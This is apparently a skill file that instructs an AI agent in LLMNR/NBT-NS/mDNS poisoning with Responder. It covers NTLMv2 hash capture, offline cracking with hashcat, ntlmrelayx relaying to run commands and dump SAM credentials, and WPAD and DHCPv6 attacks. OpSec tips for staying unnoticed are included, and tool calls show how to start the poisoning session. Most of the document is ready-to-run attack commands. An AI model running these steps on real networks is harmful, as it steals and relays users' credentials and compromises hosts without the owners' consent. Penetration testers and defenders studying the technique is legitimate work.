---
name: responder-poison
description: "Use Responder for LLMNR/NBT-NS/MDNS poisoning and NTLMv2 hash capture. Use when operating inside a Windows domain network and you need to passively capture credentials or perform a man-in-the-middle attack. Responder listens for name resolution broadcast requests on the network (LLMNR/NBT-NS/MDNS) and spoofs responses to trick targets into sending NTLMv2 authentication hashes. Captured hashes can be cracked offline with hashcat or relayed to other services with ntlmrelayx. Use this skill for LLMNR poisoning, NBT-NS poisoning, WPAD proxy, NTLMv2 capture, and man-in-the-middle attack scenarios"
zh-signals: "使用 Responder 通过 LLMNR/NBT-NS/MDNS 投毒被动捕获 NTLMv2 哈希并支持离线破解或中继。信号:Responder,LLMNR 投毒,NTLMv2 捕获,ntlmrelayx,凭据窃取"
when-to-use: "Use when operating inside a Windows domain network and you need to passively capture NTLMv2 hashes via LLMNR/NBT-NS/mDNS poisoning or relay credentials with ntlmrelayx."
metadata:
  tags: "responder,llmnr,nbt-ns,mdns,ntlm,ntlmv2,poison,poisoning,man-in-the-middle,wpad,hash,credential capture"
  category: "tool"
---

# Responder LLMNR/NBT-NS Poisoning

Responder exploits a Windows name resolution design quirk — when a DNS query fails, Windows asks over LLMNR/NBT-NS broadcast, and Responder spoofs the response so the target sends you its NTLMv2 hash. **You simply wait passively to obtain credentials, no active attack required.**

Project URL: https://github.com/lgandx/Responder

## How It Works

**Windows name resolution chain** (Responder abuses steps 4-6):

```
1. Local hosts file
2. DNS cache
3. DNS server query
4. LLMNR (UDP 5355) — link-local multicast
5. NBT-NS (UDP 137) — NetBIOS broadcast
6. mDNS  (UDP 5353) — multicast DNS
↓ When DNS fails, Windows automatically falls through to the broadcast/multicast steps 4-6
↓ Responder spoofs the responses for steps 4-6 → the target sends NTLMv2 authentication
```

```
1. The target accesses a non-existent share \\FILESERVER\share
2. DNS cannot resolve FILESERVER
3. Windows broadcasts "Who is FILESERVER?" over LLMNR/NBT-NS
4. Responder replies "I am!"
5. The target sends NTLMv2 authentication to Responder
6. Responder logs the hash
```

**Common trigger scenarios**:

| Type | Scenario | Description |
|------|------|------|
| Passive | Typo | The user types an incorrect server name |
| Passive | Stale shortcut | A .lnk pointing to a decommissioned server |
| Passive | Misconfiguration | Invalid hostnames in application configuration |
| Passive | WPAD | Browser automatic proxy discovery |
| Active | .lnk/.scf files | Placed in a shared directory to trigger NTLM |
| Active | RPC forced authentication | PetitPotam/PrinterBug |

## Basic Usage

```bash
# Start Responder (listening on a specific interface)
responder -I eth0

# Verbose mode (recommended)
responder -I eth0 -wv

# -w: enable the WPAD proxy (capture hashes from more HTTP traffic)
# -v: verbose output
# -d: enable DHCP poisoning (DHCPv6 scenarios)
# -P: force the NTLM authentication proxy (ProxyAuth)

# Listen only, no poisoning (analysis mode, run this first to confirm the environment)
responder -I eth0 -A
```

## Captured Hashes

The hashes captured by Responder are stored in the log directory:

```bash
# Default path
ls /usr/share/responder/logs/
# or
ls /opt/Responder/logs/

# Hash format (NTLMv2):
# user::DOMAIN:challenge:response:blob
# Can be fed directly to hashcat -m 5600

# NTLMv1 hashes (legacy systems / downgrade attacks): hashcat -m 5500
```

**Responder database**: Responder records captured hashes to avoid duplicates, so clear it when you want to recapture:

```bash
# Database location
ls /usr/share/responder/Responder.db
# or /opt/Responder/Responder.db

# Clear the database (recapture all hashes)
rm /usr/share/responder/Responder.db
```

## Cracking with hashcat

```bash
# Extract all captured NTLMv2 hashes
cat /usr/share/responder/logs/*.txt | sort -u > ntlmv2_hashes.txt

# Crack offline with hashcat
hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt

# -O optimized mode (truncates the password length for speed)
hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt -O
```

## Relaying with ntlmrelayx

**Relaying** is more powerful than cracking — no plaintext password is needed, the authentication is simply forwarded to another target:

```bash
# Terminal 1: Responder with SMB and HTTP disabled (let ntlmrelayx handle them)
# Edit the configuration file:
# /etc/responder/Responder.conf or /opt/Responder/Responder.conf
# [Responder Core]
# SMB = Off
# HTTP = Off
responder -I eth0 -wv

# Terminal 2: ntlmrelayx relays to the target
ntlmrelayx.py -t smb://10.0.0.5 -smb2support

# Relay to multiple targets
ntlmrelayx.py -tf targets.txt -smb2support

# Relay and execute a command
ntlmrelayx.py -t smb://10.0.0.5 -c "whoami" -smb2support

# Relay and dump credentials
ntlmrelayx.py -t smb://10.0.0.5 -smb2support --sam
```

## WPAD Attack

```bash
# Enable WPAD (automatic proxy discovery)
responder -I eth0 -wv

# WPAD attack flow:
# 1. The browser broadcasts "Who is wpad.corp.local?"
# 2. Responder replies "I am!"
# 3. The browser requests the /wpad.dat proxy configuration
# 4. Responder returns a PAC file pointing the proxy at itself
# 5. All browser HTTP traffic flows through the Responder proxy
# 6. The proxy demands NTLM authentication → capture the hash
```

## DHCPv6 Poisoning

```bash
# Windows prefers IPv6 by default → Responder acts as a DHCPv6 server and injects the attacker DNS
responder -I eth0 -dv

# Combine with mitm6 (stronger IPv6 DNS poisoning)
mitm6 -d corp.local -i eth0
# In another terminal: ntlmrelayx.py -t ldaps://DC_IP -wh attacker.corp.local
```

## OpSec Notes

- **Run analysis mode first**: `responder -A` to confirm there is LLMNR/NBT-NS traffic in the environment
- **Limit the poisoning scope**: operate only within the target subnet to avoid mass poisoning
- **Poison during business hours**: the trigger probability is higher when users are active
- **Detection indicators**: anomalous LLMNR/NBT-NS responses, authentication requests from unknown IPs, a large number of authentication failures
- **Responder.db management**: check it regularly so you do not miss new hashes for duplicate users

## Running with interactive_session

Responder requires continuous listening, so interactive_session is a good fit:

```
# Start Responder
interactive_session(action="start", session_name="responder", command="responder -I eth0 -wv")

# Check whether any hashes were captured
interactive_session(action="read", session_name="responder", wait=5)

# Inspect the log files
interactive_session(action="send", session_name="responder_check", command="ls /usr/share/responder/logs/")
```

## Decision Tree

```
Obtaining credentials inside a domain network:
├─ Wait passively (safe, stealthy) → Responder poisoning
├─ After capturing an NTLMv2 hash:
│   ├─ You need the plaintext password → crack offline with hashcat -m 5600
│   └─ You do not need the plaintext, just to exploit it → relay with ntlmrelayx
├─ Target SMB signing is not enabled → ntlmrelayx relay (most effective)
├─ Target SMB signing is enabled → you can only crack the hash
└─ You need to trigger it actively → use a vulnerability to make the target access \\ATTACKER\share
```
